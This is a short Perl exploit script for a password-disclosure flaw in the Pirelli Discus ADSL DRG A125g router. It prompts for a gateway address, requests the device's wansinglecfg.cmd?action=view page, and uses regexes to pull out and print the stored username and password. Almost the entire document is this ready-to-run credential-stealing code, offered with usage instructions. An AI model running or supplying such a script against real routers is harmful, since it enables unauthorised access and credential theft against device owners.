?#!/usr/bin/perl 
#Author: Sebastián Magof
#Vulnerable file: wansinglecfg.cmd
#Bug: Password Disclosure
# (\/)
# (**) ?lpha
#(")(")
#usage:perl exploit.pl
use LWP::UserAgent;
use HTTP::Request;
#begin
print "\n\n*******************************************************\n";
print "*  Pirelli Discus ADSL DRG A125g password disclosure  *\n";
print "*******************************************************\n\n";
print "[+] Type your Gateway. (#default gateway 10.0.0.2) : "; #10.0.0.2 default Gateway
$gateway =<STDIN>;

#pwd disclosure file
my $url = "http://$gateway/wansinglecfg.cmd?action=view";

#UserAgent
my $ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0");

#Request.
my $req = HTTP::Request->new(GET => $url);
my $request = $ua->request($req);
my $content = $request->content(); #content
my ($usr) = $content =~ m/frmLoad\('(.+)', '/;
my ($pwd) = $content =~ m/$usr', '(.+)',/;

#usr+pwd;
print "User: $usr\nPassword: $pwd\n\n";
exit(0);

__EOF__